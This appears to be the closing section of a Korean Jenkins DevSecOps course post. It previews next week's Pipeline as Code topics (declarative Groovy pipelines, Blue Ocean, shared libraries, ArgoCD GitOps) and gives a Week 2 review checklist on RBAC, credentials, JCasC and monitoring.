## 🔮 다음 주 예고: Pipeline as Code 완전 정복

**Week 3에서 배울 내용:**

#### 🔧 Declarative Pipeline 마스터
- **Groovy 기반 Pipeline DSL**: 문법부터 고급 패턴까지
- **Blue Ocean Pipeline 편집기**: 시각적 파이프라인 설계
- **Shared Libraries**: 재사용 가능한 파이프라인 컴포넌트

#### 🎯 고급 Pipeline 패턴
- **병렬 실행과 매트릭스 빌드**: 멀티플랫폼 지원
- **동적 Agent 선택**: 워크로드에 따른 자동 선택
- **조건부 실행**: 브랜치별, 환경별 다른 로직

#### 📊 Pipeline 디버깅과 최적화
- **Blue Ocean 디버깅**: 시각적 진단 도구
- **Pipeline 성능 분석**: 병목 지점 식별
- **에러 핸들링**: 우아한 실패와 복구

#### 🚀 실전 프로젝트
- **마이크로서비스 빌드 파이프라인**: 실제 Spring Boot 앱 CI/CD
- **GitOps 워크플로**: ArgoCD와의 연동
- **멀티브랜치 전략**: Git Flow와 연계된 자동화

### 📚 사전 준비사항

1. **Groovy 기본 문법**: 변수, 함수, 클로저 개념
2. **Git 브랜치 전략**: Git Flow, GitHub Flow 이해
3. **컨테이너 빌드**: Dockerfile 작성 능숙도
4. **YAML/JSON 문법**: 설정 파일 작성 경험

### 💡 Week 2 완주 체크리스트

**🎯 마스터해야 할 핵심 개념:**
- [ ] Controller-Agent 분산 아키텍처 이해
- [ ] RBAC 기반 보안 정책 수립
- [ ] Credentials 안전한 관리 방법
- [ ] 플러그인 생태계와 의존성 관리
- [ ] 고가용성 클러스터 설계 원칙
- [ ] 성능 모니터링과 튜닝 기법

**🛠️ 실습으로 익혀야 할 기술:**
- [ ] Jenkins Configuration as Code (JCasC)
- [ ] Docker Compose 기반 다중 서비스 구성
- [ ] 보안 감사 로그 분석
- [ ] 백업/복구 시스템 운영
- [ ] 실시간 보안 모니터링 설정

---

**"보안은 나중에 추가하는 것이 아닙니다. 처음부터 설계에 포함되어야 합니다."**

다음 주에는 Pipeline as Code의 세계로 떠납니다. 단순한 스크립트를 넘어 진정한 "코드로서의 인프라"를 경험하게 될 것입니다. 여러분의 DevSecOps 여정이 본격적으로 가속화됩니다! ⚡